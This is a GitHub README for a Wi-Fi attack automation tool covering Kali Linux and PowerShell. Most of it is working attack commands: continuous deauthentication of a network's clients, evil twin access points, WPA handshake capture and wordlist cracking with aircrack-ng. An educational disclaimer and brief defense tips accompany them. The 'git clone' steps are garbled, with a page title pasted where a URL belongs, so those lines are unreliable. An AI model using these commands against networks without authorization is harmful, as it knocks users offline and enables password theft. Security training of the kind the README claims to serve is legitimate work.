# https://github.com/Danyalkhattak/wifi-attack-tool

🔥 Wi-Fi Attack Automation Tool (Kali Linux & Windows PowerShell) 🔥​
This tool allows you to automate Wi-Fi attacks such as Deauthentication, Evil Twin, and WPA Handshake Capture in Kali Linux, and enables Wi-Fi scanning and learning features in Windows PowerShell. Perfect for cybersecurity students and professionals!

🚨 Disclaimer: This tool is for educational purposes only. Always get permission from network owners before conducting any attacks.

📜 Features​
🔥 Kali Linux Version:​

    🕵️ Network Scanning: Identify nearby Wi-Fi networks.
    🚫 Deauthentication Attack: Disconnect all clients from a target network.
    💀 Evil Twin Attack: Set up a rogue Wi-Fi access point.
    📡 WPA Handshake Capture: Capture handshakes for offline cracking.
    🛡️ Defense Tips: Learn how to defend your network against attacks.

💻 Windows PowerShell Version:​

    🕵️ Wi-Fi Scanning: View available Wi-Fi networks.
    🛡️ Defense Tips: Learn about Wi-Fi security best practices.
    📚 Educational Features: Gain insights into different types of Wi-Fi attacks and how they work.

🎯 How to Use​
Kali Linux Setup​
1. Install Dependencies​
Ensure you have all necessary tools installed:

sudo apt-get install aircrack-ng hostapd dnsmasq

2. Clone the Repo​
git clone GitHub - Danyalkhattak/wifi-attack-tool: Wi-Fi Attack Automation Tool for Kali Linux and Windows PowerShell automates Wi-Fi attacks like Deauthentication, Evil Twin, and WPA Handshake Capture. Ideal for cybersecurity enthusiasts to learn and practice network penetration testing and Wi-Fi security.
cd wifi-attack-tool

3. Install Python Dependencies​
pip install -r requirements.txt

4. Run the Tool​
sudo python3 main.py

Windows PowerShell Setup​
1. Clone the Repo​
For Windows PowerShell, you can clone the repository by running:

git clone GitHub - Danyalkhattak/wifi-attack-tool: Wi-Fi Attack Automation Tool for Kali Linux and Windows PowerShell automates Wi-Fi attacks like Deauthentication, Evil Twin, and WPA Handshake Capture. Ideal for cybersecurity enthusiasts to learn and practice network penetration testing and Wi-Fi security.
cd wifi-attack-tool

2. Install Dependencies​
You may need to install some PowerShell modules:

Install-Module -Name WiFiProfileManagement

You can also use built-in cmdlets for simple network scanning.

3. Run the Tool​
.\main.ps1

📡 Wi-Fi Scanning​
Kali Linux:​

    Run the network scanning module to view nearby Wi-Fi networks:

sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon

Windows PowerShell:​

    Scan for available Wi-Fi networks:

netsh wlan show networks

🚀 Attacks (Kali Linux)​

    Deauthentication Attack:
        Disconnect clients from a target network:
        sudo airmon-ng start wlan0 <channel>
        sudo aireplay-ng --deauth 0 -a <BSSID> wlan0mon
    Evil Twin Attack:
        Create a fake access point:
        sudo hostapd -B /etc/hostapd.conf
        sudo dnsmasq -C /etc/dnsmasq.conf
    WPA Handshake Capture:
        Capture a WPA handshake:
        sudo airodump-ng --bssid <BSSID> --channel <channel> -w <output> wlan0mon
    Crack WPA Handshake:
        Crack the captured WPA handshake using a wordlist:
        sudo aircrack-ng <handshake.cap> -w /usr/share/wordlists/rockyou.txt

🛡️ Defense Measures​
Linux & Windows:​
After simulating attacks, learn how to protect your network:

    Use WPA3 encryption for enhanced security.
    Disable WPS (Wi-Fi Protected Setup).
    Enable 802.11w to protect management frames.
    Set a strong and unique Wi-Fi password.
    Regularly monitor your network for suspicious devices.

🎯 Windows PowerShell Features​
In Windows PowerShell, this tool provides insights and educational examples on common Wi-Fi attacks. It includes:

    Wi-Fi Scanning: View the available Wi-Fi networks around you.
    Attack Simulations: Learn how attacks like Deauthentication and Evil Twin work (educational only).
    Defense Tips: Understand how to protect your network against common attacks.
    check : GitHub - Danyalkhattak/wifi-attack-tool: Wi-Fi Attack Automation Tool for Kali Linux and Windows PowerShell automates Wi-Fi attacks like Deauthentication, Evil Twin, and WPA Handshake Capture. Ideal for cybersecurity enthusiasts to learn and practice network penetration testing and Wi-Fi security.
